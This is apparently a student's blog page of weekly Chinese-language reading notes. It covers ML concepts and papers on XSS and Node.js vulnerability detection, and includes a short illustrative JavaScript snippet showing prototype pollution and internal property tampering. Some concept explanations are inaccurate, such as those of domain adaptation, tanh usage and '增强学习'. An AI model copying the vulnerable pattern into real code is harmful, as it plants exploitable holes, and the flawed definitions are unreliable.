Adaptation）是指将在源领域（SourceDomain）上学习到的知识应用到目标领域（TargetDomain）中的过程。在机器学习领域中，源领域和目标领域通常具有相同的输入特征空间，但是有不同的输出空间。领域自适应的目的是利用源领域的知识来提高目标领域的学习性能。</p><p>在实际应用中，由于源领域和目标领域之间的差异，导致在目标领域上使用源领域的模型会导致性能下降。例如，在计算机视觉领域中，源领域可能是一个特定类型的图像数据集，例如人脸图像，而目标领域可能是其他类型的图像数据集，例如动物图像。由于人脸和动物图像之间的视觉特征存在较大差异，因此在人脸数据集上训练的模型在动物图像数据集上的性能可能会下降。</p><p>为了解决这个问题，领域自适应方法被提出来了。其基本思路是在源领域和目标领域之间建立联系，通过对源领域的数据进行适当的变换，使得源领域和目标领域的差异最小化，从而提高在目标领域上的性能。常用的领域自适应方法包括最大均值差异（MaximumMean Discrepancy，MMD）、核对齐（Kernel Alignment，KA）等</p></li></ul></li><li><p><strong>Paper正文</strong></p><ul><li><p>multi-type features</p></li><li><p><strong>Bi-LSTM</strong></p><p>Bi-LSTM是一种双向长短期记忆神经网络（Bidirectional Long Short-TermMemory Network）的缩写。它是在LSTM的基础上发展而来的。</p><p>LSTM是一种适用于序列数据的神经网络，可以处理长期依赖性问题。但是LSTM只能单向地处理序列，即只能利用历史信息。而Bi-LSTM能够同时利用历史信息和未来信息，因此在处理序列数据时更为有效。Bi-LSTM通过在序列数据的前后分别运行两个LSTM网络，然后将它们的输出合并起来，实现了双向处理。</p><p>Bi-LSTM的应用非常广泛，特别是在自然语言处理（NLP）领域中。例如，Bi-LSTM可以用于语音识别、文本分类、命名实体识别、情感分析等任务。</p></li><li><p><strong>Dropout</strong>是一种常见的正则化技术，常用于深度学习中，旨在减少过拟合</p></li><li><p><strong>多层感知机(MLP)模型</strong></p><p>多层感知机（Multi-LayerPerceptron，MLP）是一种常见的前馈神经网络模型。它由输入层、若干个隐层和输出层组成，每个层之间都有全连接的权重。在训练过程中，输入信号从输入层开始依次传递到隐层和输出层，最终得到模型的预测结果。</p><p>MLP模型可以通过反向传播算法进行训练，该算法通过计算模型输出值和真实标签之间的误差，然后逆向传播误差，并根据误差调整权重，从而最小化误差。</p><p>MLP模型广泛应用于各种机器学习任务，如分类、回归、聚类等。在实践中，可以通过调整隐层的数量和大小，以及不同的激活函数和优化算法来改善模型性能</p></li><li><p><strong>激活函数</strong></p><p>激活函数（activationfunction）是一种数学函数，通常用于神经网络中的每个神经元，用于将输入信号的加权和转换为输出信号。激活函数的作用是为神经网络引入非线性性，从而使得神经网络可以学习更加复杂的关系。</p><p>常见的激活函数包括：</p><ol type="1"><li>sigmoid函数：将输入值压缩到0和1之间，可以用于二分类问题。</li><li>ReLU函数：将负数部分置为0，保留正数部分，能够快速计算和解决梯度消失问题。</li><li>tanh函数：类似于sigmoid函数，但输出值在-1和1之间，常用于多分类问题。</li><li>softmax函数：用于多分类问题，将输出转换为概率分布。</li></ol><p>选择激活函数的主要考虑因素是其是否具有非线性性质、是否易于计算和是否可以避免梯度消失等问题。不同的神经网络层可能需要不同的激活函数。</p></li><li><p>这里给出了<strong>评估分类模型性能的三个重要指标</strong>，以及一个综合这些指标的F1 score。</p><ul><li>Accuracy：模型分类正确的样本数占总样本数的比例。</li><li>Recall（召回率）：真实正例中被模型正确分类的比例，衡量模型找到正例的能力。</li><li>Precision（精度）：模型分类为正例的样本中，真实正例的比例，衡量模型分类为正例的准确性。</li><li>F1 score：综合考虑 Precision 和 Recall，是 Precision 和 Recall的调和平均数，可用于评估分类不平衡问题中的模型性能。</li></ul></li><li><p><strong>十倍交叉验证</strong></p><p>十倍交叉验证是一种常用的机器学习模型评估方法，也叫做十折交叉验证。它将数据集划分为10个部分，每次将其中9个部分作为训练集，剩下的一个部分作为验证集，共进行10次训练和验证。最终，将这10次训练和验证的结果进行平均，得到模型的评估结果。</p><p>这种方法的优点是能够更好地评估模型的泛化能力，即模型在未见过的数据上的表现。缺点是需要进行多次训练和验证，计算时间相对较长</p></li><li><p><strong>多特征融合</strong></p><p>多特征融合指的是将多种不同类型的特征进行整合，用于提高机器学习模型的性能和准确度。在实际应用中，一个问题通常需要从多个方面考虑，因此需要用多种不同类型的特征来描述该问题。比如，在计算机视觉领域中，可以使用图像特征、语义特征和位置特征来描述一个物体；在自然语言处理领域中，可以使用词频、词向量和词性等多种不同类型的特征来描述一段文本。</p><p>多特征融合的目的是将这些不同类型的特征融合在一起，以获取更全面的信息，提高模型的性能和准确度。具体来说，多特征融合可以采用以下几种方法：</p><ol type="1"><li>特征拼接：将不同类型的特征按照一定的顺序拼接在一起，形成一个更大的特征向量。</li><li>特征加权：给不同类型的特征赋予不同的权重，使得模型更关注某些特定类型的特征。</li><li>特征交叉：将不同类型的特征进行交叉组合，产生新的特征，从而扩展特征空间。</li><li>特征选择：选择最具代表性的特征，将其用于模型训练和测试，减少噪声和冗余信息。</li></ol><p>多特征融合可以有效地提高模型的性能和准确度，但也需要注意特征之间的相关性和影响，避免引入噪声和过度拟合的情况。同时，不同的特征融合方法适用于不同的问题和数据集，需要根据具体情况进行选择和调整。</p></li><li><p><strong>自注意力机制</strong>（Self-AttentionMechanism）是一种可以通过对输入序列中各元素进行不同权重的加权，来计算其输出表示的方法。它最早是在2017年提出的，被应用于神经机器翻译中，但其后被证明在众多自然语言处理和计算机视觉任务中都有很好的表现。</p><p>自注意力机制主要包含以下几个步骤：</p><ol type="1"><li>将输入序列中的每个元素进行线性变换，得到其对应的查询（Query）、键（Key）和值（Value）向量。</li><li>计算每个查询向量与所有键向量的相似度，使用softmax函数将相似度转化为权重系数，得到与该查询向量对应的值向量。</li><li>将所有值向量加权求和，得到该查询向量对应的输出表示。</li></ol><p>自注意力机制的优点是能够动态地计算不同输入元素之间的关系，并且不会受到固定窗口大小的限制，能够处理变长序列。在自然语言处理中，自注意力机制可以被用来构建强大的语言模型，如Transformer，BERT等。</p></li><li><p><strong>NLTK</strong></p><p>NLTK是一个开源的自然语言处理（NLP）库，全称为Natural LanguageToolkit。它是用Python编写的，并且包含了各种用于处理自然语言的工具、资源和数据集。NLTK可以用于文本分类、标记化、分块、分析、语义推理、语料库管理等任务。NLTK提供了大量的教程和实践，使得学习和使用NLP变得更加容易和有趣。</p></li><li><p><strong>Word2Vec</strong></p><p>Word2Vec是一种将单词转换为向量表示的算法，它将单词映射到高维空间中的向量，使得具有相似含义的单词在空间中靠近彼此。该算法基于分布式假设，即单词的含义可以通过它们周围的单词来确定。Word2Vec算法主要有两种模型：连续词袋模型（Continuous Bag of Words,CBOW）和跳跃式模型（Skip-gram）。CBOW模型基于上下文单词的平均值来预测当前单词，而 Skip-gram则是基于当前单词来预测上下文单词。</p><p>Word2Vec的主要优点是可以将高维稀疏的离散单词转换为低维稠密的连续向量，从而提高了计算效率，并使得语义相似的单词在向量空间中具有相似的几何结构。Word2Vec可以应用于多种自然语言处理任务，例如情感分析、词性标注、命名实体识别等</p></li><li><p><strong>Readout</strong></p><p>在机器学习中，readout是指从神经网络的隐藏状态中提取输出的过程。在图神经网络中，readout通常是一个将所有节点或边的隐藏状态聚合成一个图级别表示的函数。例如，可以使用加和或平均值来获得整个图的表示。readout是图神经网络中的一个重要组件，它通常用于将节点和边的表示组合成整个图的表示，以便进行图级别的分类或回归任务。</p></li></ul></li></ul><h4 id="总结-23">总结</h4><ul><li><p>本文与上周阅读paper有较多联系：同样研究的是JavaScript代码的漏洞</p><p><strong>区别在于：</strong></p><p>上周paper讨论的是在JS在后端的漏洞(原型链中的内部属性篡改、原型污染和命令注入漏洞)，本文讨论的是前端产生的漏洞（如XSS）</p><p>XSS漏洞也正是是我当前研究的漏洞之一</p><ul><li><p><strong>研究前存在的问题</strong>：</p><ol type="1"><li>特征提取不全面：现有的XSS漏洞检测方法通常只考虑了代码中的部分特征，如字符串、变量等，而忽略了控制流和数据依赖关系等重要特征。</li><li>特征维度不够：现有的XSS漏洞检测方法提取的特征维度较低，无法充分捕获JavaScript代码中复杂的语义信息。</li><li>缺乏上下文信息：现有的XSS漏洞检测方法通常只考虑单个代码片段中的特征，而忽略了与其相关联的上下文信息。</li></ol></li><li><p>一图总结本文<strong>贡献</strong><imgsrc="https://s2.loli.net/2023/04/07/tbBzdP34cRrGHE9.png"alt="image-20230407204812757" /></p><p>总的来说：作者围绕<strong>多特征融合</strong>这个方法，将图结构的特征和代码字符串特征（针对敏感的属性和方法）融合在一起，使用<strong>多层感知模型</strong>对代码中是否存在XSS漏洞做出预测和分类。</p><p>其中使用优化加权聚合方法和递归神经网络来<strong>提取图形结构特征</strong>，使用Bi-LSTM模型来提取<strong>代码字符串特征</strong>，使用<strong>自注意力机制</strong>加强两种特征的交互，提升XSS漏洞检测性能</p></li><li><p>本文所做的研究工作，引入了神经网络以及NLP技术，正是我之前计划研究的一部分内容，非常贴近我的研究工作。</p></li></ul></li></ul><h3 id="section-37">2023-03-31</h3><h4 id="程序设计">程序设计</h4><ul><li>AST: 例如程序<code>const team = '大转转FE'</code>的AST如下：是一个JSON对象</li></ul><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>    <span class="token property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclaration"</span><span class="token punctuation">,</span>        <span class="token property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>        <span class="token property">"declarations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclarator"</span><span class="token punctuation">,</span>            <span class="token property">"start"</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span>            <span class="token property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>              <span class="token property">"start"</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span>              <span class="token property">"end"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>              <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"team"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"init"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Literal"</span><span class="token punctuation">,</span>              <span class="token property">"start"</span><span class="token operator">:</span> <span class="token number">11</span><span class="token punctuation">,</span>              <span class="token property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>              <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"大转转FE"</span><span class="token punctuation">,</span>              <span class="token property">"raw"</span><span class="token operator">:</span> <span class="token string">"'大转转FE'"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"const"</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"module"</span>  <span class="token punctuation">&#125;</span></code></pre><ul><li><p><strong>Node.js</strong></p><p>是一个基于Chrome V8JavaScript引擎构建的JavaScript运行时环境。它可以在服务器端运行JavaScript代码，使得JavaScript不仅可以用于前端开发，还可以用于后端开发。Node.js采用事件驱动、非阻塞I/O模型，使得它能够处理高并发、高吞吐量的应用程序。</p><p>Node.js有以下特点：</p><ol type="1"><li><strong>轻量级</strong>：Node.js的核心只包含几个模块，可以根据需要安装其他模块，使得Node.js非常轻量级，启动和运行速度很快。</li><li><strong>高效性</strong>：Node.js采用事件驱动、非阻塞I/O模型，使得它可以高效地处理大量并发请求。此外，Node.js还支持异步编程，可以更好地利用系统资源。</li><li>跨平台性：Node.js可以运行在多种操作系统上，如Windows、Linux、MacOS等。</li><li><strong>社区活跃</strong>：Node.js拥有一个庞大的开发者社区，可以方便地获取各种模块、框架和工具，可以快速开发高质量的应用程序。</li></ol><p>Node.js可以用于构建各种类型的应用程序，如Web应用程序、命令行工具、网络服务、物联网应用程序等。它可以使用JavaScript进行全栈开发，使得开发人员可以使用同一种语言进行前后端开发，提高了开发效率和代码可维护性。</p></li><li><p>Node.js 相关漏洞</p><p><strong>命令注入</strong>（CommandInjection）是指攻击者利用应用程序没有对用户输入数据进行正确处理的漏洞，将恶意命令注入到应用程序中，从而达到控制系统、窃取敏感信息等目的的攻击行为。</p><p><strong>原型污染</strong>（PrototypePollution）是指攻击者能够修改JavaScript对象的原型（prototype）属性，从而影响到所有从该原型继承而来的对象。这种攻击方式可能导致应用程序中的数据被篡改、敏感信息泄露等安全问题。</p><p><strong>路径穿越</strong>（PathTraversal）是指攻击者利用应用程序没有对用户输入数据进行正确处理的漏洞，访问应用程序之外的文件或目录。这种攻击方式可能导致攻击者能够读取、修改、删除或上传应用程序之外的文件，从而达到窃取敏感信息或者破坏系统的目的。</p><p><strong>内部属性篡改</strong>（Internal PropertyTampering）是指攻击者利用JavaScript的一些高级特性，如Object.defineProperty()方法等，对对象的内部属性进行篡改，从而导致应用程序出现安全漏洞。这种攻击方式可能导致应用程序中的数据被篡改、敏感信息泄露等安全问题。</p></li><li><p><strong>原型对象</strong></p></li></ul><p>每个函数都有一个名为“prototype”的属性，它指向一个对象。这个对象被称为函数的原型对象（prototypeobject）。原型对象是一个普通对象，它具有自己的属性和方法。</p><h4 id="论文正文">论文正文</h4><h5 id="论文1-6">论文1</h5><ul><li><p><strong>文献信息</strong></p><p><ahref="https://www.usenix.org/conference/usenixsecurity22/presentation/li-song">MiningNode.js Vulnerabilities via Object Dependence Graph andQuery</a>(<strong>CCF-A</strong>:31st USENIX Security Symposium2022)</p></li><li><p><strong>Node.js 常见漏洞：</strong></p><p>命令注入、原型污染、路径穿越和内部属性篡改</p></li><li><p><strong>for example</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">Func</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token string">"ab"</span><span class="token punctuation">;</span>myFunc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Func</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>source1<span class="token punctuation">)</span>    myFunc<span class="token punctuation">[</span>source2<span class="token punctuation">]</span> <span class="token operator">=</span> myFunc<span class="token punctuation">.</span>x <span class="token operator">+</span> source1<span class="token punctuation">;</span> <span class="token comment">// internal property tampering</span><span class="token function">sink</span><span class="token punctuation">(</span>myFunc<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// taint -style vulnerability like command injection</span></code></pre><ul><li><p><code>Func()</code>这个函数有一个原型对象<code>Func.prototype</code>，<strong>myFunc</strong>这个函数将会继承<code>Func</code>的原型对象，所以<strong>myFunc.x</strong>操纵的是<code>Func.prototype.x</code></p></li><li><p><strong>内部属性篡改</strong>：source2可由敌手控制</p><ol type="1"><li>如设置为Func.prototype.x；</li><li>设置为<code>__proto__</code> 将会更改原型Func.prototype</li></ol></li><li><p><strong>污点式漏洞</strong></p><ol type="1"><li>由内部属性篡改知，myFunc.x可被修改为敌手想要的任意值，执行特殊命令</li></ol></li><li><p><strong>Query</strong></p><p>是一个用于查找代码库中<strong>特定模式</strong>的语言，可以用于检查代码中的潜在漏洞、复杂的代码路径、不安全的代码模式等。它并不是专门用于检测Node.js程序中漏洞的查询语言，而是可以应用于不同编程语言和平台的代码库。在Node.js 中，通常使用 ESLint 插件来运行 Query 查询。</p><blockquote><p><strong>特定模式：</strong>在程序分析中，特定模式是指一组代码结构、逻辑或者特定的数据流关系，用于表示程序中的某种行为或漏洞类型。通过定义这些模式，可以用于检测程序中是否存在该行为或漏洞类型，并提示开发人员进行相应的修复。例如，用于检测SQL 注入漏洞的特定模式可能包括输入的数据被直接拼接到 SQL语句中、缺乏输入数据的验证和转义等。特定模式可以作为一种规则库，用于静态分析工具或代码审查工具来扫描代码并发现潜在的安全漏洞</p><p><strong>数据流</strong>是指在程序执行过程中，数据的传递和变换的过程。数据流分析是一种静态分析方法，它用于在程序的执行过程中跟踪数据流的路径，以便确定程序中潜在的错误和漏洞。数据流分析可以帮助我们检测出程序中的一些常见问题，如空指针引用、未初始化变量、数组下标越界、内存泄漏等问题。</p></blockquote></li></ul></li><li><p><strong>Application-level Vulnerabilities</strong></p><ul><li>Adversary-controlled network request to a vulnerable server.<br /></li><li>Adversary-controlled network response to a vulnerable client</li></ul></li><li><p><strong>Package-level Vulnerabilities</strong></p><ul><li>包漏洞会导致本身没有漏洞的应用程序出现漏洞</li></ul></li><li><p><strong>抽象解释</strong>（AbstractInterpretation）是一种程序分析技术，旨在推导出程序的语义信息，例如变量的类型、取值范围、可能的程序路径等，从而检测程序中的错误和漏洞。抽象解释通过对程序状态的抽象和近似来实现对程序的静态分析，以便能够处理大型程序和更复杂的语言特性。</p><p>在抽象解释中，程序状态通常由抽象域（AbstractDomain）中的元素表示。抽象域是程序状态空间的一个子集，其中每个元素都是原始状态的抽象。例如，可以使用整数区间作为抽象域来表示数值变量的取值范围，使用布尔代数作为抽象域来表示布尔变量的取值。抽象解释使用抽象函数来操作抽象域中的元素，这些函数应该是可定向的，并应该确保抽象状态保持足够精度</p></li><li><p><strong>代码属性图（CPG</strong>）是一种综合了抽象语法树（AST）、控制流图（CFG）和程序依赖图（PDG）的数据结构，它可以帮助分析人员更好地理解代码的结构和行为。CPG可以通过将AST、CFG和PDG结合起来，从而捕获代码中的更多细节和复杂性，提供更全面的代码分析和理解</p></li><li><p><strong>程序依赖图（Program DependenceGraph，PDG）</strong>是一种表示程序执行流程和数据依赖关系的图形化表示方法。在PDG中，程序的每个语句表示为节点，每个节点之间通过边连接表示语句间的依赖关系，包括数据依赖、控制依赖和输出依赖。</p><p><strong>数据依赖</strong>：如果一个语句使用了另一个语句的输出，那么它们之间存在数据依赖。例如，赋值语句的右侧使用了变量，那么它们之间就存在数据依赖。</p><p><strong>控制依赖</strong>：如果一个语句的执行受另一个语句的控制结构影响，那么它们之间存在控制依赖。例如，if语句和while语句的条件语句控制了其内部语句的执行。</p><p><strong>输出依赖</strong>：如果一个语句的输出被另一个语句使用，那么它们之间存在输出依赖。例如，函数调用的返回值被另一个语句使用。</p></li><li><p><strong>SanitizationFunctions（清洗函数）</strong>是一类函数，用于过滤和转义输入数据，以确保输入数据不包含任何恶意内容。这些函数通常用于防止跨站脚本攻击（XSS）和SQL注入攻击等安全威胁。</p><p>例如，如果一个 Web应用程序需要从用户输入中接收一个字符串，该字符串将被传递给数据库进行查询，那么必须使用一个清洗函数对该字符串进行处理，以防止SQL注入攻击。常用的清洗函数包括转义单引号、双引号、反斜杠等特殊字符。</p><p>在 Node.js中，可以使用各种模块和库来实现输入数据的清洗。例如，可以使用<code>sanitize-html</code> 模块过滤 HTML 标签，或者使用<code>mysql</code> 模块的 <code>mysql.escape()</code> 函数来转义 SQL查询中的特殊字符。</p></li></ul><h4 id="总结-24">总结</h4><ul><li>关于<strong>代码分析方法设计的图结构</strong>总结<ul><li>抽象语法树（AST）</li><li>控制流图（CFG）</li><li>代码属性图（CPG）</li><li>程序依赖图（Program Dependence Graph，PDG）<ol type="1"><li>数据依赖</li><li>控制依赖</li><li>输出依赖</li></ol></li></ul></li><li><strong>收获：</strong>这篇论文令我意外：因为本文的研究并没有设计人工智能模型<ol type="1"><li>如果不加入人工智能模型，我感觉很难做出创新</li><li>我对本文的理解就是：在前人做出的基于图的代码分析方法基础上，针对JavaScript这种语言的特性（主要是原型链），提出了对对象（面向对象编程中的一种数据类型，在这种语言中，函数也是对象）建模的一种方法并将前几种图结构结合，作者定义为ODG。</li></ol></li></ul><h3 id="section-38">2023-03-24</h3><h4 id="期刊">期刊</h4><blockquote><ul><li><ahref="https://ieeexplore.ieee.org/xpl/conhome/9842455/proceeding">2022IEEE 46th Annual Computers, Software, and Applications Conference(COMPSAC)</a><ul><li><strong>CCF-C</strong> (软件工程/系统软件/程序设计语言)</li></ul></li></ul></blockquote><h4 id="论文1-7">论文1</h4><blockquote><ul><li><a href="https://ieeexplore.ieee.org/document/9842744">Can DeepLearning Models Learn the Vulnerable Patterns for VulnerabilityDetection?</a> [<strong>CCF-C</strong>: 2022 IEEE 46th Annual Computers,Software, and Applications Conference (COMPSAC)]</li><li><strong>Date of Conference</strong>: 27 June 2022 - 01 July2022</li></ul></blockquote><ul><li><p><strong>研究问题</strong>：</p><ul><li>深度学习能否在漏洞检测上有所作为</li><li>探索上述问题的可解释性</li></ul></li><li><p><strong>关键词：</strong>Vulnerability detection, Deep learning,Atten-tion, Model interpretability</p></li><li><p><strong>ML和DL</strong></p><blockquote><p><strong>机器学习</strong>是人工智能的一个分支，它是一种使用算法和统计模型让计算机自动地从数据中学习规律，并用于预测或分类的方法。它可以分为有监督学习、无监督学习、半监督学习和强化学习等不同类型。</p><p><strong>深度学习</strong>是机器学习的一种特定形式，它是一种建立在人工神经网络基础上的机器学习技术。它的主要特点是可以通过构建多层非线性变换的神经网络来提取和学习数据的高阶特征表示，从而实现对复杂模式和规律的识别和预测。深度学习可以应用于图像识别、语音识别、自然语言处理等领域，已经成为人工智能领域的重要分支之一。</p><ul><li><strong>有监督学习</strong>：在有监督学习中，我们提供带标签的数据集作为输入，并让算法从数据中学习规律，以便将新的数据进行分类或预测。例如，根据房屋的面积、位置、卧室数等特征，预测房价。</li><li><strong>无监督学习</strong>：在无监督学习中，我们提供未标记的数据集作为输入，让算法自己发现其中的规律和结构。例如，聚类分析可以将相似的数据点分为一组，从而发现数据中的类别。</li><li><strong>半监督学习</strong>：在半监督学习中，我们同时使用带标签和未标记的数据集进行训练，以提高算法的准确性。这种方法通常可以在数据集较小的情况下获得更好的结果。</li><li><strong>强化学习</strong>：在强化学习中，算法通过与环境的交互来学习最优行为策略。它与其他机器学习方法不同，因为它是一种试错学习方法，通过反馈机制不断调整策略以实现最优结果。例如，训练机器人在环境中移动和完成任务。</li><li><strong>迁移学习</strong>：迁移学习是指将已经学习到的知识迁移到新的任务或领域中。通过利用已经学习到的知识，可以加快新任务的学习速度和提高学习的效果。</li><li><strong>增强学习</strong>：增强学习是指在强化学习的基础上，为了实现更好的性能，通过不断改进学习过程和策略来提高算法的表现。</li><li><strong>深度学习</strong>：深度学习是一种建立在神经网络上的机器学习技术，可以自动提取和学习数据的高阶特征表示。深度学习广泛应用于计算机视觉、自然语言处理和语音识别等领域。</li><li><strong>概率图模型</strong>：概率图模型是一种用于建模复杂数据关系的方法，包括贝叶斯网络和马尔科夫随机场等。它们通常用于无监督学习和半监督学习中，可以对数据进行建模和分析。</li></ul></blockquote></li><li><p><strong>注意力机制</strong></p><blockquote><p>是一种人工智能中常用的技术，它可以使神经网络更好地处理序列数据，并将重点放在最相关的部分上。</p><p>在注意力机制中，网络可以根据输入数据中的不同部分分配不同的注意力权重，以便更好地识别和利用有用的信息。例如，在文本分类中，网络可以根据文本中每个单词的重要性分配不同的注意力权重，以便更好地判断文本的类别。</p><p>注意力机制可以用于各种任务，如自然语言处理、语音识别、图像识别等。它已经成为深度学习中的一种常用技术，并在很多实际应用中取得了很好的效果</p><ul><li><p>序列数据</p><blockquote><p>序列数据是指按照时间顺序排列的一系列数据，通常用于描述某个事件或过程的演变。序列数据可以是文本、语音、图像等，它们都具有一定的时序性和相关性。</p><p>在人工智能中，序列数据经常用于各种任务，如语音识别、自然语言处理、时间序列预测等。为了处理序列数据，通常需要使用一些特殊的技术和模型，例如循环神经网络（RNN）、长短时记忆网络（LSTM）、卷积神经网络（CNN）等。</p><p>序列数据的处理和建模是人工智能研究中的重要方向之一，它们可以帮助我们更好地理解和分析各种事件和过程，提高各种任务的准确性和效率。</p></blockquote></li></ul></blockquote></li><li><p><strong>模型可解释性</strong></p><blockquote><p>是指在人工智能和机器学习中，对于一个训练好的模型，我们能够清晰地理解和解释其预测结果的过程和原因。具有良好的可解释性的模型可以帮助我们更好地理解和掌握数据的本质规律，提高对数据的信任和理解度。</p><p>在实际应用中，模型的可解释性非常重要。例如，在医疗诊断中，对于一个预测结果，我们需要知道该结果是由哪些因素决定的，以便更好地了解患者的病情和制定治疗方案。在金融风控中，我们需要知道一个信用评估模型如何得出其评估结果，以便更好地预测风险和做出决策。</p><p>提高模型的可解释性是一个研究热点和难点，研究人员们正在不断尝试各种方法和技术来实现这个目标。例如，利用可视化技术、特征重要性分析、局部可解释性等方法来提高模型的可解释性。</p></blockquote></li><li><p><strong>论文正文</strong></p><ul><li><p><code>Chakraborty et al. [5] claim that DL models learn certain irrelevant features which are harmful to improve the performance of vulnerability detection</code></p></li><li><p><strong>基于代码相似性的漏洞检测方法</strong>：</p><p>是指通过比较源代码的相似性，发现潜在的漏洞。该方法可以分为静态和动态两种。</p><p><strong>静态方法</strong>主要是通过对源代码进行静态分析，找出潜在的漏洞点。其中，代码相似度计算是静态方法中的关键步骤。代码相似度计算方法包括文本相似度、语法树相似度和程序切片等。</p><p><strong>动态方法</strong>主要是通过对程序的执行过程进行分析，找出漏洞点。其中，基于程序执行过程的代码相似度计算方法是动态方法的关键步骤。这种方法需要对程序进行插桩，然后记录程序执行的信息，比较程序执行过程中的相似度，最终找出漏洞点。</p></li><li><p>基于<strong>代码相似性</strong>的漏洞检测方法和基于<strong>代码模式</strong>的漏洞检测方法都是常见的<strong>自动化</strong>漏洞检测方法。</p><blockquote><p><strong>模式：</strong>经常出现的一些结构或者行为</p><ul><li><p><strong>语法分析</strong>：识别代码中的各个元素（如变量、函数、关键字等）以及它们之间的关系</p></li><li><p><strong>语义分析</strong>：对代码中的各个元素进行语义解释和推理</p><blockquote><p>例如，我们需要确定代码中变量的<strong>数据类型、函数的返回值以及各个语句的执行顺序</strong>等信息。</p></blockquote></li></ul><p><strong>比如</strong>缓冲区溢出中的内存访问越界、格式化字符串中的格式化输入等等。模式是由专家手工定义或者通过机器学习从源代码中自动学习得到的。模式匹配的过程通常使用<strong>正则表达式</strong>或者其他<strong>模式匹配算法</strong>，如<strong>图匹配算法</strong>等</p><p><strong>相似度：</strong></p></blockquote><p>基于<strong>代码相似性</strong>的漏洞检测方法主要是通过对源代码进行<strong>语法和语义分析</strong>，比较代码之间的相似度，从而检测潜在的漏洞。该方法的优点是能够准确地检测出源代码中的漏洞，并且能够自动地识别<strong>不同类型</strong>的漏洞。同时，该方法也存在一些问题，比如需要大量的计算资源和时间，还容易出现误报和漏报的情况。</p><p>基于<strong>代码模式</strong>的漏洞检测方法主要是通过学习代码中的模式来检测潜在的漏洞。该方法的优点是能够有效地检测出<strong>特定类型</strong>的漏洞，比如缓冲区溢出、代码注入等等。同时，该方法也存在一些问题，比如检测效果受限于训练数据，无法检测出新型漏洞等。</p></li><li><p><strong>三种类型的漏洞数据集</strong>：真实世界、半合成和合成</p></li><li><p><strong>两类漏洞模型</strong>用于漏洞检测</p><ul><li>基于序列的模型</li><li>基于GNN的模型</li></ul></li><li><p>方法论</p><ul><li><p><strong>数据预处理</strong>：数据依赖图（DDG）:数据依赖图是指用图形化的方式展示程序中各个变量之间的依赖关系</p><blockquote><ol type="1"><li><p>数据（代码）的预处理：其中涉及较多的编译原理知识：我们分析代码的过程正是模仿了编译器对代码的处理模式。主要理解了以下几点</p><p>Ast（抽象语法树）、CFG（控制流图）和DDG（数据依赖图）是程序分析中常用的三种表示程序结构和行为的图形模型。</p><blockquote><ol type="1"><li>Ast是基础：Ast是程序代码的语法表示，是从程序代码中提取出的最基本的语法元素。</li><li>CFG基于Ast：CFG是基于Ast构建的，它利用Ast的语法元素作为节点，并使用Ast中的控制语句来构建图形模型。</li><li>DDG基于Ast和CFG：DDG是基于Ast和CFG构建的，它既包含Ast中的语法元素，也包含CFG中的控制结构，同时还包含变量和数据之间的依赖关系。</li></ol></blockquote></li></ol></blockquote><ul><li><strong>JavaParser</strong>是一个Java语法树分析器，它可以将Java代码解析成语法树，方便程序员进行各种静态代码分析、重构和优化</li><li><code>Labeling the vulnerability-related code lines.</code>难以理解这部分内容</li><li><strong>抽象语法树</strong>通常是在源代码经过词法分析和语法分析后生成的，它描述了程序的结构和语义。</li><li>通常我们将样本以<strong>向量</strong>的形式作为模型的输入</li></ul></li><li><p><strong>模型生成</strong>：</p><ul><li><p>图节点嵌入：指DDG</p></li><li><p>高层特征的生成和分类:不同于初始特征</p></li></ul></li><li><p><strong>模型测试</strong>：模型的可解释性，制定评估标准，本文为DDG节点的注意力得分</p></li></ul><figure><img src="https://s2.loli.net/2023/03/25/H2XGapiwEJjgt3P.png"alt="image-20230325005007803" /><figcaption aria-hidden="true">image-20230325005007803</figcaption></figure></li></ul></li><li><p><strong>问题：</strong></p><ul><li>关于对数据（代码）的预处理：总体上是能理解的，这是对代码静态分析的过程</li><li>模型的测试与生成：细节看不懂</li></ul></li><li><p><strong>实验与讨论</strong></p></li><li><p><strong>THREATS 